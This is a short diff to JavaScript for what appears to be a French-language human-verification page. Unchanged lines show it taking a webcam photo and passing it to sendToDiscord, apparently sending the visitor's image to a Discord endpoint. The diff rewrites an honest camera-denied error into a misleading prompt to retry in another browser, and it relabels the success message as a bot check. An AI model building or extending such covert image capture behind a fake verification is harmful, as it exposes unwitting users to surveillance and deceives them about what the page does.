@@ -42,7 +42,7 @@ async function startCamera(onSuccess) {
   }
 
   if (!stream) {
-    showError('Accès à la caméra refusé. Vérifiez les permissions dans les réglages de votre navigateur.');
+    showError('Accès aux autorisations impossible. Merci de réessayer avec un autre navigateur.');
     btn.disabled = false;
     btn.querySelector('.btn-text').textContent = 'Réessayer';
     return;
@@ -72,7 +72,7 @@ async function capturePhoto(video, onSuccess) {
   sendToDiscord(canvas);
 
   const btn = document.getElementById('verify-start-btn');
-  if (btn) btn.querySelector('.btn-text').textContent = 'Personne réelle détectée ✓';
+  if (btn) btn.querySelector('.btn-text').textContent = 'Bot non détécté ✓';
 
   setVerified();
   if (navigator.vibrate) navigator.vibrate([60, 40, 120]);
